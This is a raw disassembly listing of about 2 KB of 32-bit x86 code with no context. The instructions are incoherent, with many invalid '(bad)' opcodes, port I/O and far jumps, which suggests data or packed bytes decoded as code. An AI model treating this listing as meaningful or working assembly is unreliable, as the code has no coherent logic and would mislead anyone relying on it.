  411fb9:	lods   eax,DWORD PTR ds:[esi]
  411fba:	adc    cl,BYTE PTR [ebx-0x18]
  411fbd:	jns    0x411fe0
  411fbf:	mov    ds:0x2307ee05,eax
  411fc4:	xor    ebx,DWORD PTR [esi-0xfb2d43e]
  411fca:	ret    0x6821
  411fcd:	cwde   
  411fce:	push   ss
  411fcf:	jb     0x412036
  411fd1:	xor    edx,DWORD PTR [edi+edi*1+0x4e]
  411fd5:	(bad)  es:0xd1a1f179
  411fdc:	xchg   edx,eax
  411fdd:	jle    0x411f60
  411fdf:	and    BYTE PTR [ebp-0x286ed18c],ch
  411fe5:	jmp    0xa0007bf
  411fea:	int3   
  411feb:	mov    BYTE PTR [edi*4-0x294138b],bh
  411ff2:	data16 repnz fimul DWORD PTR [ebx]
  411ff6:	out    0x9f,eax
  411ff8:	pushf  
  411ff9:	mov    al,ds:0xe380d359
  411ffe:	and    BYTE PTR [edx],dh
  412000:	fmul   st,st(0)
  412002:	clc    
  412003:	mov    edx,0xd4091eed
  412008:	push   edi
  412009:	cld    
  41200a:	and    bl,ah
  41200c:	out    dx,al
  41200d:	cs out 0x57,al
  412010:	and    eax,0x782346f
  412015:	(bad)  
  412016:	pop    ecx
  412017:	push   ebp
  412018:	cld    
  412019:	mov    ah,dh
  41201b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41201c:	scas   al,BYTE PTR es:[edi]
  41201d:	sahf   
  41201e:	mov    ebx,0x8be18d52
  412023:	fsub   st(0),st
  412025:	push   es
  412026:	dec    edx
  412027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412028:	sub    ebp,DWORD PTR ds:[esi+ebx*2]
  41202c:	cmp    ecx,esp
  41202e:	push   cs
  41202f:	lock popa 
  412031:	cmp    DWORD PTR [eax],ecx
  412033:	clc    
  412034:	inc    eax
  412035:	pusha  
  412036:	pop    ds
  412037:	xor    esp,edi
  412039:	std    
  41203a:	xor    BYTE PTR [esi-0x21233505],0x9c
  412041:	(bad)  
  412043:	dec    ebx
  412044:	out    0x10,al
  412046:	sbb    DWORD PTR [ebp+0x686362a],ebx
  41204c:	mov    al,0x7f
  41204e:	jecxz  0x4120c2
  412050:	sub    DWORD PTR [ecx+eiz*8-0x6a1c419],edi
  412057:	ja     0x4120be
  412059:	push   0x2e
  41205b:	test   al,0x87
  41205d:	inc    ebx
  41205e:	sub    esi,esp
  412060:	cmp    esi,esp
  412062:	push   ecx
  412063:	add    DWORD PTR [edx],esp
  412065:	xchg   DWORD PTR [ebx-0x2b3b4363],ebp
  41206b:	inc    ecx
  41206c:	je     0x41206b
  41206e:	cmc    
  41206f:	mov    ebp,0xfd44c42c
  412074:	repnz (bad) 
  412076:	(bad)  
  412077:	pop    ss
  412078:	xor    al,0x57
  41207a:	mov    ecx,0xb7c471ea
  41207f:	mov    al,0x67
  412081:	sub    BYTE PTR [ebx+0x73],al
  412084:	pop    ss
  412085:	push   edi
  412086:	out    0xa2,al
  412088:	jge    0x412070
  41208a:	lock popf 
  41208c:	pop    eax
  41208d:	ficomp WORD PTR [ebp+0x11000e66]
  412093:	pop    esi
  412094:	lahf   
  412095:	mov    ecx,0x4f8f5779
  41209a:	dec    ecx
  41209b:	xor    eax,0x33140d32
  4120a0:	and    BYTE PTR [edi+0x49],al
  4120a3:	push   ecx
  4120a4:	stos   DWORD PTR es:[edi],eax
  4120a5:	pop    esi
  4120a6:	fdiv   DWORD PTR [ebp+0x35]
  4120a9:	mov    esp,0xd3d8e1f9
  4120ae:	jp     0x4120a4
  4120b0:	pop    edi
  4120b1:	sbb    al,0x6b
  4120b3:	jne    0x4120c1
  4120b5:	addr16 mov esi,0xb89201f4
  4120bb:	pop    ebx
  4120bc:	cld    
  4120bd:	adc    esp,esp
  4120bf:	rcl    DWORD PTR [ebx+eiz*8+0x6b],0x9f
  4120c4:	ss push ds
  4120c6:	dec    edx
  4120c7:	and    BYTE PTR [edi-0x30ac08cb],bl
  4120cd:	and    ch,BYTE PTR ds:0xad4fafe3
  4120d3:	scas   al,BYTE PTR es:[edi]
  4120d4:	xor    DWORD PTR [ebx],ebp
  4120d6:	xor    eax,0x50ca21de
  4120db:	jo     0x4120c5
  4120dd:	pop    esi
  4120de:	mov    ds:0xad1a0ea7,al
  4120e3:	xor    esp,esi
  4120e5:	arpl   sp,bx
  4120e7:	ret    0xb169
  4120ea:	fwait
  4120eb:	adc    BYTE PTR ds:0xc1e19ae1,bl
  4120f1:	jae    0x4120f0
  4120f3:	lahf   
  4120f4:	shr    DWORD PTR [ebp-0x56],0x6a
  4120f8:	ret    
  4120f9:	arpl   cx,bp
  4120fb:	mov    al,0x40
  4120fd:	jl     0x412125
  4120ff:	int3   
  412100:	dec    ebp
  412101:	xor    eax,0x91116658
  412106:	cmp    BYTE PTR [edi-0x24560943],cl
  41210c:	int    0xfe
  41210e:	add    DWORD PTR [eax+0x55e07eb4],0xfb4af3df
  412118:	faddp  st(2),st
  41211a:	xchg   edx,eax
  41211b:	pop    ebx
  41211c:	mov    ds:0xfe017b34,eax
  412121:	xchg   ecx,eax
  412122:	pop    ecx
  412123:	hlt    
  412124:	push   ds
  412125:	mov    cs,esi
  412127:	jnp    0x4120b4
  412129:	jne    0x4120e0
  41212b:	scas   eax,DWORD PTR es:[edi]
  41212c:	sub    eax,0xecadbd1a
  412131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412132:	or     DWORD PTR [eax],ebx
  412134:	aam    0x55
  412136:	xchg   ebp,eax
  412137:	jmp    0x9f0d9392
  41213c:	lock adc edx,DWORD PTR [ecx-0x1f804c81]
  412143:	or     DWORD PTR [edi-0x385e86e1],eax
  412149:	or     DWORD PTR ds:0x50d94c1b,edi
  41214f:	and    eax,0xb1d572dd
  412154:	scas   eax,DWORD PTR es:[edi]
  412155:	sub    eax,0x2034cad3
  41215a:	jae    0x412167
  41215c:	scas   eax,DWORD PTR es:[edi]
  41215d:	dec    edi
  41215e:	lea    eax,[eax+0x6962cc58]
  412164:	ins    BYTE PTR es:[edi],dx
  412165:	and    eax,0xdabc8f7f
  41216a:	mov    DWORD PTR [eax-0x5a],ecx
  41216d:	mov    al,ds:0xcf7e63cc
  412172:	mov    BYTE PTR [eax+0x23],ch
  412175:	xor    al,0x75
  412177:	cdq    
  412178:	jge    0x5f9d6398
  41217e:	pop    ebp
  41217f:	push   edi
  412180:	pop    es
  412181:	push   esp
  412182:	mov    WORD PTR ds:0x3f3938d1,ds
  412188:	mov    ah,bl
  41218a:	push   es
  41218b:	add    al,0x66
  41218d:	rcr    edx,1
  41218f:	mov    dh,0xc6
  412191:	inc    eax
  412192:	fs out dx,eax
  412194:	cmp    DWORD PTR [esi+0x3b3870f6],esi
  41219a:	arpl   di,bx
  41219c:	push   ebp
  41219d:	xchg   DWORD PTR [edx+0x4c8eccdf],edi
  4121a3:	fiadd  WORD PTR [ebx+0xf]
  4121a6:	test   BYTE PTR [ebx+0x74387e89],dh
  4121ac:	js     0x4121f4
  4121ae:	pop    ebx
  4121af:	pop    DWORD PTR [edx+0x248ec785]
  4121b5:	mov    dh,0x80
  4121b7:	pusha  
  4121b8:	into   
  4121b9:	mov    al,ds:0x74a59ee1
  4121be:	out    0xca,eax
  4121c0:	and    ebx,esi
  4121c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c3:	push   edi
  4121c4:	jmp    0x517f74ab
  4121c9:	fdiv   QWORD PTR [esi+0x5aea8cf4]
  4121cf:	dec    ecx
  4121d0:	inc    eax
  4121d1:	fidiv  DWORD PTR [eax+0x25]
  4121d4:	sbb    al,0x25
  4121d6:	das    
  4121d7:	mov    esp,es
  4121d9:	pusha  
  4121da:	rcl    ah,0x38
  4121dd:	inc    ecx
  4121de:	xor    bh,dl
  4121e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e1:	fldenv [edi-0x4d]
  4121e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e5:	add    BYTE PTR [eax-0x6fbf96a8],dl
  4121eb:	jno    0x4121f9
  4121ed:	mov    esp,0x28724d49
  4121f2:	outs   dx,DWORD PTR ds:[esi]
  4121f3:	pop    ebp
  4121f4:	push   ds
  4121f5:	xchg   edx,eax
  4121f6:	xor    DWORD PTR [esi+0x49],esp
  4121f9:	xor    edx,DWORD PTR [ebp+0x2d]
  4121fc:	xchg   edx,eax
  4121fd:	xor    edx,ebx
  4121ff:	mov    ecx,0xd2cc0dc5
  412204:	xchg   DWORD PTR [edx+eax*1-0x28],edx
  412208:	push   ss
  412209:	mov    bh,0x11
  41220b:	fmul   st,st(2)
  41220d:	mov    eax,0xb889e227
  412212:	sbb    BYTE PTR [edi],cl
  412214:	jmp    0x9235:0x25bbb43c
  41221b:	ss ss pop edx
  41221e:	repnz cmc 
  412220:	mov    ah,0x23
  412222:	inc    edx
  412223:	repnz or ecx,DWORD PTR [edx+0xb964a9d]
  41222a:	sub    ebp,eax
  41222c:	sar    ebx,0xd9
  41222f:	mov    esi,0xf9a3aef6
  412234:	push   es
  412235:	jo     0x4121f6
  412237:	jns    0x412282
  412239:	dec    eax
  41223a:	fcomp  DWORD PTR [edi+0x46]
  41223d:	inc    ebp
  41223e:	fcom   QWORD PTR [esp+eax*2]
  412241:	sbb    eax,0x5491147d
  412246:	arpl   ax,bp
  412248:	js     0x412229
  41224a:	fcom   QWORD PTR [edx+eiz*1]
  41224d:	xor    edi,DWORD PTR [edx]
  41224f:	fsub   QWORD PTR [edx-0x4ac7a97c]
  412255:	(bad)  
  412256:	leave  
  412257:	in     al,dx
  412258:	int    0x3b
  41225a:	add    al,0x7e
  41225c:	pop    es
  41225d:	jns    0x412260
  41225f:	jmp    0x909b:0xf92cd924
  412266:	fisttp DWORD PTR [ecx+0x6f]
  412269:	xchg   ecx,eax
  41226a:	mov    ch,0xdf
  41226c:	adc    al,0xb0
  41226e:	aaa    
  41226f:	cli    
  412270:	stos   DWORD PTR es:[edi],eax
  412271:	(bad)  
  412273:	cdq    
  412274:	sub    al,0x6b
  412276:	or     esp,esp
  412278:	and    al,0xf2
  41227a:	(bad)  
  41227b:	sbb    ecx,DWORD PTR [edx+0x29]
  41227e:	(bad)  
  412280:	fldenv [edi+0x1a832c38]
  412286:	cwde   
  412287:	(bad)  
  412288:	into   
  412289:	lds    esi,FWORD PTR ds:0x9cf05fc7
  41228f:	hlt    
  412290:	test   edx,0x760a7d9
  412296:	adc    ch,dl
  412298:	add    DWORD PTR [edx-0x2f4a1b41],esi
  41229e:	jmp    0x653c:0x98f1c713
  4122a5:	pop    ss
  4122a6:	sar    BYTE PTR [eax-0x44fffd66],1
  4122ac:	push   0x52
  4122ae:	dec    esi
  4122af:	fist   WORD PTR [edi-0x2b]
  4122b2:	jl     0x41231d
  4122b4:	dec    esi
  4122b5:	in     eax,0x2f
  4122b7:	cmp    BYTE PTR [ebx-0x3a6e2c57],al
  4122bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122be:	push   ebx
  4122bf:	repz fwait
  4122c1:	jo     0x41224d
  4122c3:	sbb    bh,BYTE PTR [eax]
  4122c5:	jne    0x41232c
  4122c7:	xlat   BYTE PTR ds:[ebx]
  4122c8:	mov    ecx,0x599c32e0
  4122cd:	std    
  4122ce:	pusha  
  4122cf:	icebp  
  4122d0:	in     eax,0x29
  4122d2:	xchg   esi,eax
  4122d3:	xchg   esi,eax
  4122d4:	iret   
  4122d5:	mov    esi,0x5770ca1f
  4122da:	and    eax,0x9de53e04
  4122df:	shl    BYTE PTR [ebp-0x6dd9cd9d],1
  4122e5:	dec    esi
  4122e6:	loop   0x4122af
  4122e8:	and    eax,0x2efa929f
  4122ed:	lds    ebp,FWORD PTR [eax]
  4122ef:	add    al,0x61
  4122f1:	cmp    dl,BYTE PTR [edi]
  4122f3:	mov    ebp,DWORD PTR [ebp-0x5ecff3b8]
  4122f9:	jecxz  0x412372
  4122fb:	stos   DWORD PTR es:[edi],eax
  4122fc:	sahf   
  4122fd:	add    edi,DWORD PTR [edi]
  4122ff:	addr16 mov ds:0x6b47,al
  412303:	cwde   
  412304:	sub    BYTE PTR [esi+0x5a0506aa],ah
  41230a:	fcmovbe st,st(2)
  41230c:	ds std 
  41230e:	jns    0x41238e
  412310:	xchg   BYTE PTR ds:0x8a502fd1,ah
  412316:	add    DWORD PTR [ebx],ebp
  412318:	push   ds
  412319:	inc    edx
  41231a:	mov    ds:0x7d9f42a8,al
  41231f:	mov    ebp,0xfee28f04
  412324:	dec    edx
  412325:	jbe    0x4122f0
  412327:	mov    esi,0x357d669d
  41232c:	adc    eax,0xb9fea802
  412331:	dec    ecx
  412332:	jno    0x4122e4
  412334:	push   ss
  412335:	xchg   DWORD PTR [ecx],ebp
  412337:	jo     0x412366
  412339:	int3   
  41233a:	adc    eax,0x78213b4e
  41233f:	fwait
  412340:	inc    esp
  412341:	popf   
  412342:	add    eax,0xedc01618
  412347:	jmp    0x81dc:0xc0cc8eb
  41234e:	stos   DWORD PTR es:[edi],eax
  41234f:	aad    0xf2
  412351:	(bad)  
  412352:	push   ecx
  412353:	jg     0x412342
  412355:	cmp    esp,ebx
  412357:	out    dx,al
  412358:	test   eax,0x8e56e73b
  41235d:	or     esp,DWORD PTR [eax+0x2be0274f]
  412363:	add    DWORD PTR [esi],0xfbc0c163
  412369:	pop    eax
  41236a:	daa    
  41236b:	or     eax,0x180db7a4
  412370:	jge    0x4123de
  412372:	(bad)  
  412373:	xor    BYTE PTR [esi-0x423fa863],dh
  412379:	fistp  QWORD PTR [ebx-0x3549b027]
  41237f:	mov    edi,0xdbeaf058
  412384:	cmp    BYTE PTR [esi+ecx*4+0x68],ah
  412388:	test   DWORD PTR [ecx+0x61e8d101],ebx
  41238e:	mov    ebx,0xc94d2805
  412393:	mov    eax,ds:0xd74975e0
  412398:	mov    eax,0x17c1b929
  41239d:	ins    DWORD PTR es:[edi],dx
  41239e:	xchg   esi,eax
  41239f:	adc    edi,eax
  4123a1:	mov    ah,0x7
  4123a3:	pop    ebx
  4123a4:	fs push cs
  4123a6:	das    
  4123a7:	call   0x6bcb:0xc415c42e
  4123ae:	ins    BYTE PTR es:[edi],dx
  4123af:	sub    eax,0x745090af
  4123b4:	cwde   
  4123b5:	mov    al,0xb7
  4123b7:	xchg   esi,eax
  4123b8:	popf   
  4123b9:	mov    dh,dh
  4123bb:	mov    ah,0x7e
  4123bd:	pop    edx
  4123be:	fcomp  DWORD PTR [eax]
  4123c0:	fwait
  4123c1:	jne    0x4123be
  4123c3:	aam    0xa5
  4123c5:	jp     0x412435
  4123c7:	in     al,dx
  4123c8:	jl     0x412377
  4123ca:	cmp    BYTE PTR [eax],bl
  4123cc:	popw   es
  4123ce:	(bad)  
  4123cf:	out    0x11,al
  4123d1:	fist   DWORD PTR [eax]
  4123d3:	push   esi
  4123d4:	in     eax,0x6
  4123d6:	retf   
  4123d7:	ret    
  4123d8:	jo     0x4123d8
  4123da:	mov    edi,0x25e12a1b
  4123df:	stos   DWORD PTR es:[edi],eax
  4123e0:	jno    0x412415
  4123e2:	push   eax
  4123e3:	ins    DWORD PTR es:[edi],dx
  4123e4:	ds pop ds
  4123e6:	push   cs
  4123e7:	or     cl,BYTE PTR [edi-0x3de6c204]
  4123ed:	nop
  4123ee:	ret    0xc5cc
  4123f1:	mov    ch,0xb6
  4123f3:	and    al,BYTE PTR [edx+esi*8+0x3bd0cf5c]
  4123fa:	mov    dh,0x12
  4123fc:	add    al,0x32
  4123fe:	push   es
  4123ff:	std    
  412400:	or     esi,ecx
  412402:	dec    ecx
  412403:	test   BYTE PTR [ebp+0x1c],0x72
  412407:	cmp    al,0xc6
  412409:	mov    dh,0xd2
  41240b:	sbb    DWORD PTR [eax+0x22],edx
  41240e:	int3   
  41240f:	mov    eax,0xb0162269
  412414:	cmp    eax,0xce9b4be3
  412419:	adc    al,0xa4
  41241b:	data16 lods al,BYTE PTR ds:[esi]
  41241d:	and    DWORD PTR [esi],eax
  41241f:	mov    bh,BYTE PTR [edi*8-0x55bb899e]
  412426:	cli    
  412427:	fsub   QWORD PTR [eax-0x35813e0c]
  41242d:	mov    dl,0xb
  41242f:	fbstp  TBYTE PTR [esi]
  412431:	cmp    eax,0x37
  412434:	lock jmp 0x5031:0xf8331f8f
  41243c:	cs jnp 0x41248a
  41243f:	or     eax,0x47141b0a
  412444:	call   0x9ff3:0x14f47985
  41244b:	out    0x44,eax
  41244d:	xchg   esi,eax
  41244e:	and    BYTE PTR [edx-0x74ef6353],0x11
  412455:	xor    DWORD PTR [eax+0x2a],ebp
  412458:	leave  
  412459:	jl     0x41249b
  41245b:	pushf  
  41245c:	(bad)  
  41245d:	cld    
  41245e:	mov    dl,0xc
  412460:	and    dh,BYTE PTR [edx+ebx*8-0x43]
  412464:	mov    DWORD PTR gs:[ebx],esp
  412467:	je     0x412470
  412469:	sbb    bl,BYTE PTR cs:[ebx+0xb]
  41246d:	cld    
  41246e:	push   ss
  41246f:	fwait
  412470:	in     al,0xcd
  412472:	adc    al,0xc0
  412474:	cmc    
  412475:	ins    DWORD PTR es:[edi],dx
  412476:	test   bl,cl
  412478:	in     al,dx
  412479:	gs arpl bp,di
  41247c:	jbe    0x41248c
  41247e:	lds    esi,FWORD PTR [ecx]
  412480:	mov    cl,0x24
  412482:	nop
  412483:	cwde   
  412484:	mov    BYTE PTR [edx-0x7274450b],al
  41248a:	gs pop ebx
  41248c:	mov    ebx,0xcd7f896e
  412491:	mov    ah,0x90
  412493:	in     al,dx
  412494:	js     0x412491
  412496:	lods   eax,DWORD PTR ds:[esi]
  412497:	leave  
  412498:	mov    eax,0xc3e5331c
  41249d:	in     al,dx
  41249e:	sub    ch,BYTE PTR [edx+0x6f1ba73d]
  4124a4:	push   cs
  4124a5:	push   ds
  4124a6:	outs   dx,DWORD PTR ds:[esi]
  4124a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124a8:	jne    0x412449
  4124aa:	push   ebp
  4124ab:	jae    0x4124e1
  4124ad:	loope  0x4124db
  4124af:	sub    DWORD PTR [ebp+0x4b],esi
  4124b2:	mov    ah,0x1b
  4124b4:	and    bh,BYTE PTR [eax]
  4124b6:	and    BYTE PTR [eax-0x74],ch
  4124b9:	adc    ecx,DWORD PTR [edx-0x1d9e2023]
  4124bf:	int3   
  4124c0:	fistp  DWORD PTR [eax-0x4fdc39]
  4124c6:	(bad)  
  4124c7:	aam    0x31
  4124c9:	pop    ss
  4124ca:	cmp    DWORD PTR [ecx-0x6193299a],ebp
  4124d0:	sbb    BYTE PTR [ecx-0x44],cl
  4124d3:	jno    0x41252a
  4124d5:	pop    edi
  4124d6:	gs mov dh,0x5
  4124d9:	lea    esi,[edx+edx*1+0x9a6e91f]
  4124e0:	retf   
  4124e1:	imul   ebx,ecx,0x6d
  4124e4:	rol    DWORD PTR ds:0xb4d714ec,0xbe
  4124eb:	mov    WORD PTR [edi],gs
  4124ed:	fidivr DWORD PTR [edi-0x17ef78d0]
  4124f3:	lds    ebp,FWORD PTR [ebx+0x7d]
  4124f6:	out    dx,al
  4124f7:	adc    bh,dl
  4124f9:	lods   al,BYTE PTR ds:[esi]
  4124fa:	cli    
  4124fb:	mov    DWORD PTR [ecx+0x18],esp
  4124fe:	cmp    BYTE PTR [ecx],bl
  412500:	addr16 icebp 
  412502:	ins    WORD PTR es:[edi],dx
  412504:	repz shl BYTE PTR [eax],cl
  412507:	enter  0x8871,0xb
  41250b:	scas   al,BYTE PTR es:[edi]
  41250c:	jo     0x4124c4
  41250e:	adc    eax,0x81d11fce
  412513:	sbb    BYTE PTR [eax+edi*2],bh
  412516:	sub    edx,edi
  412518:	out    0x81,al
  41251a:	sub    bh,BYTE PTR [ebp-0x262a6658]
  412520:	das    
  412521:	shl    DWORD PTR [eax+ebx*1],1
  412524:	lahf   
  412525:	sub    esi,esi
  412527:	call   0x3efb719
  41252c:	or     eax,DWORD PTR [ecx]
  41252e:	int    0x64
  412530:	lods   al,BYTE PTR ds:[esi]
  412531:	mov    ebx,0xa1966fda
  412536:	mov    ebp,0x1f0cbfe6
  41253b:	xchg   ebx,eax
  41253c:	jecxz  0x412500
  41253e:	or     DWORD PTR [ebx],ecx
  412540:	cwde   
  412541:	jg     0x412539
  412543:	jae    0x4124c6
  412545:	xor    dh,BYTE PTR [edx-0x47]
  412548:	mov    WORD PTR [ebp+ebx*2+0x7f3f8209],gs
  41254f:	sahf   
  412550:	pop    ecx
  412551:	shl    DWORD PTR [edx-0x19],0x68
  412555:	mov    ds:0xf7b046d2,al
  41255a:	sbb    DWORD PTR [esi],ebp
  41255c:	jmp    0x811e:0x93182dab
  412563:	ret    0x8f41
  412566:	inc    edi
  412567:	bound  edi,QWORD PTR [ebx]
  412569:	aam    0xd
  41256b:	inc    ebp
  41256c:	xor    ch,BYTE PTR [ebx]
  41256e:	sbb    ecx,esi
  412570:	sub    esp,ecx
  412572:	or     BYTE PTR [edx-0x7d],dh
  412575:	popf   
  412576:	mov    ecx,0x7309bd37
  41257b:	jmp    0x412525
  41257d:	stos   DWORD PTR es:[edi],eax
  41257e:	pop    es
  41257f:	xchg   ebp,eax
  412580:	inc    BYTE PTR [ebx-0x778e7b2]
  412586:	jg     0x41252d
  412588:	fwait
  412589:	jbe    0x4125c1
  41258b:	push   es
  41258c:	jo     0x4125a5
  41258e:	nop
  41258f:	adc    bl,BYTE PTR [ecx-0x61]
  412592:	test   DWORD PTR ds:0x29a25097,esp
  412598:	outs   dx,BYTE PTR ds:[esi]
  412599:	fdiv   DWORD PTR [ecx-0x13977296]
  41259f:	inc    ebp
  4125a0:	fist   WORD PTR [edi-0xa28ce50]
  4125a6:	test   BYTE PTR [edi],cl
  4125a8:	repz shl BYTE PTR [edi-0x7d],1
  4125ac:	dec    ecx
  4125ad:	dec    ecx
  4125ae:	mov    ch,0x21
  4125b0:	test   BYTE PTR [eax-0x4e],0x4d
  4125b4:	cmp    eax,0x546f4610
  4125b9:	and    DWORD PTR [eax+0x1c],eax
  4125bc:	imul   ch
  4125be:	sahf   
  4125bf:	add    DWORD PTR [eax+eiz*1],0xfffffff8
  4125c3:	xlat   BYTE PTR ds:[ebx]
  4125c4:	push   cs
  4125c5:	fstp   DWORD PTR [ebx+0x39]
  4125c8:	jbe    0x412552
  4125ca:	add    DWORD PTR [eax-0x2da10c8c],edi
  4125d0:	imul   edi,DWORD PTR [esp+ebx*8],0x76f4d17e
  4125d7:	sbb    eax,DWORD PTR [eax]
  4125d9:	push   ss
  4125da:	add    al,0x6e
  4125dc:	popa   
  4125dd:	ret    0xb7e8
  4125e0:	imul   ebx,DWORD PTR [ebp-0x2ef5ad22],0x8cfa95b8
  4125ea:	je     0x4125a8
  4125ec:	js     0x412647
  4125ee:	in     eax,dx
  4125ef:	push   ecx
  4125f0:	sar    DWORD PTR [edi-0x5a311581],1
  4125f6:	cdq    
  4125f7:	dec    edx
  4125f8:	adc    al,0x8
  4125fa:	sub    eax,0x4445940e
  4125ff:	lea    eax,[edx+0xcfbbfc0]
  412605:	sub    bh,BYTE PTR [ecx+0x8f2ce71]
  41260b:	retf   0x3515
  41260e:	(bad)  
  41260f:	inc    ecx
  412610:	scas   eax,DWORD PTR es:[edi]
  412611:	ret    0x2a4f
  412614:	imul   DWORD PTR [edx+ecx*1-0x66ab2802]
  41261b:	and    eax,0x16926e62
  412620:	add    dh,BYTE PTR [edx+edi*1]
  412623:	mov    BYTE PTR [ebx+0x15],al
  412626:	aad    0x44
  412628:	dec    ecx
  412629:	or     edi,esp
  41262b:	rol    DWORD PTR [eax-0x3538d0e0],1
  412631:	pop    eax
  412632:	ret    0xe01e
  412635:	cs mov dh,0xd3
  412638:	lods   al,BYTE PTR ds:[esi]
  412639:	mov    ebx,0x52a9f4ce
  41263e:	fdiv   QWORD PTR [ebx]
  412640:	and    edi,DWORD PTR [edx+0x13b06af6]
  412646:	or     bh,ah
  412648:	neg    BYTE PTR [ecx+0x6a5f9f15]
  41264e:	cmp    eax,0x6a575b4d
  412653:	imul   edi,DWORD PTR [ecx],0x9a543f05
  412659:	shr    BYTE PTR ss:[ecx],cl
  41265c:	dec    esp
  41265d:	adc    al,0xdc
  41265f:	sub    DWORD PTR [ecx],edx
  412661:	push   edx
  412662:	and    BYTE PTR [esi+0x54],al
  412665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412666:	xor    BYTE PTR [eax-0x38e2f03d],cl
  41266c:	add    DWORD PTR fs:[ebx],esp
  41266f:	pop    esp
  412670:	inc    edi
  412671:	sub    dh,cl
  412673:	enter  0x127,0xa4
  412677:	shl    DWORD PTR [ebp-0x41],1
  41267a:	or     DWORD PTR [eax-0x5c863315],0x612d9791
  412684:	and    al,0xef
  412686:	lahf   
  412687:	add    al,0x81
  412689:	and    DWORD PTR [eax-0x21220e26],ebp
  41268f:	push   edx
  412690:	fcomp  QWORD PTR [ebx+ecx*1-0x4472301d]
  412697:	xlat   BYTE PTR ds:[ebx]
  412698:	jae    0x412635
  41269a:	xchg   ecx,eax
  41269b:	jl     0x4126f8
  41269d:	clc    
  41269e:	add    BYTE PTR [edx*1+0x64b9485d],al
  4126a5:	clc    
  4126a6:	mov    al,ds:0x2641758f
  4126ab:	int3   
  4126ac:	mov    ds:0xb0e52c45,eax
  4126b1:	push   0xc4aa24ef
  4126b6:	jno    0x4126e3
  4126b8:	lock call 0x8b17:0x3403f96a
  4126c0:	and    BYTE PTR [esi+0x67242ec2],dh
  4126c6:	retf   0x8d98
  4126c9:	nop
  4126ca:	pop    ebp
  4126cb:	out    dx,al
  4126cc:	jbe    0x412690
  4126ce:	and    eax,0xefa41f23
  4126d3:	fs sub eax,ebp
  4126d6:	mov    eax,0x494c2e9c
  4126db:	push   ecx
  4126dc:	push   edi
  4126dd:	ins    BYTE PTR es:[edi],dx
  4126de:	jecxz  0x412670
  4126e0:	stc    
  4126e1:	pop    es
  4126e2:	sbb    eax,0x671b2611
  4126e7:	repz imul esi,eax,0xffffffaf
  4126eb:	push   ebp
  4126ec:	xor    edx,ebx
  4126ee:	out    0xa8,eax
  4126f0:	jmp    0x4126a7
  4126f2:	sub    BYTE PTR [ebx],0x32
  4126f5:	mov    al,ds:0xb1b2b567
  4126fa:	and    eax,0xaf1e3082
  4126ff:	fnstsw WORD PTR [edx-0x362defd3]
  412705:	(bad)  [eax+0x57]
  412708:	mov    bh,0xfe
  41270a:	jo     0x412776
  41270c:	push   0x17
  41270e:	xor    edx,DWORD PTR [ecx+0x1c5d534b]
  412714:	addr16 cmp al,0x48
  412717:	adc    eax,0x4b7c5ecd
  41271c:	mov    bh,0xdc
  41271e:	(bad)  
  41271f:	mov    ah,0x8e
  412721:	or     eax,0xf04d7ef0
  412726:	fisttp QWORD PTR [ebp+0x32ab7cae]
  41272c:	jae    0x41272b
  41272e:	in     al,dx
  41272f:	iret   
  412730:	xor    BYTE PTR [eax],bl
  412732:	inc    eax
  412733:	in     al,0x2c
  412735:	mov    eax,0xb4ca3081
  41273a:	push   ss
  41273b:	cli    
  41273c:	(bad)  [edx+0x29c65bb4]
  412742:	mov    al,dh
  412744:	xor    BYTE PTR [edi],cl
  412746:	sub    eax,0xd810a85
  41274b:	sbb    bl,bl
  41274d:	mov    dh,0x43
  41274f:	or     BYTE PTR [esi-0x1bdf113b],ah
  412755:	out    0x44,al
  412757:	sar    BYTE PTR [ebx-0x2],1
  41275a:	xchg   ecx,eax
  41275b:	jle    0x41279e
  41275d:	(bad)  [edx+0x4c]
  412760:	push   ebp
  412761:	frndint 
  412763:	fsubr  DWORD PTR [esi+eax*8+0x53fdf4ba]
  41276a:	pop    eax
  41276b:	jl     0x41279e
  41276d:	mov    al,0x76
  41276f:	sbb    BYTE PTR [eax],0xe3
  412772:	mov    cl,0xeb
  412774:	out    dx,al
  412775:	mov    ah,0xd0
  412777:	scas   eax,DWORD PTR es:[edi]
  412778:	loopne 0x412702
  41277a:	mov    ch,0x78
  41277c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41277d:	and    BYTE PTR [eax],bl
  41277f:	in     al,0x8d
  412781:	sub    al,0x76
  412783:	popf   
  412784:	outs   dx,BYTE PTR ds:[esi]
  412785:	(bad)  
  412786:	retf   0xf551
  412789:	sbb    eax,0x9533268e
  41278e:	rcr    DWORD PTR [edx-0x5b],cl
  412791:	mov    al,0xd1
  412793:	xchg   ebx,eax
  412794:	and    dh,BYTE PTR es:[edx]
  412797:	sub    dl,BYTE PTR [ecx]
  412799:	sbb    eax,0x2309430f
  41279e:	mov    ds:0x98e703be,al
  4127a3:	(bad)
  4127a6:	dec    ebx
  4127a7:	repnz mov gs,edx
  4127aa:	mov    esp,0x5ac51845
  4127af:	dec    edi
  4127b0:	pusha  
  4127b1:	into   
  4127b2:	imul   ecx,DWORD PTR [edi-0x3b46f223],0xffffff96
  4127b9:	or     eax,0xeaf9e067
  4127be:	pushf  
  4127bf:	sub    DWORD PTR [edi+0x68a3a92b],edi
  4127c5:	pop    es
  4127c6:	add    eax,0xf09722a
  4127cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127cc:	mov    al,0x4d
  4127ce:	add    eax,0xeab4cd03
  4127d3:	cmp    BYTE PTR [edi],0x37
  4127d6:	add    al,0x41
  4127d8:	rcl    DWORD PTR [edx-0x42],cl
  4127db:	mov    edx,DWORD PTR [esp+ebp*1+0x32d63982]
  4127e2:	in     al,dx
  4127e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e4:	popf   
  4127e5:	pop    edx
  4127e6:	mov    ?,WORD PTR [ecx-0x33]
  4127e9:	xor    edx,edi
  4127eb:	sbb    DWORD PTR ss:[edx-0x45241ebb],edi
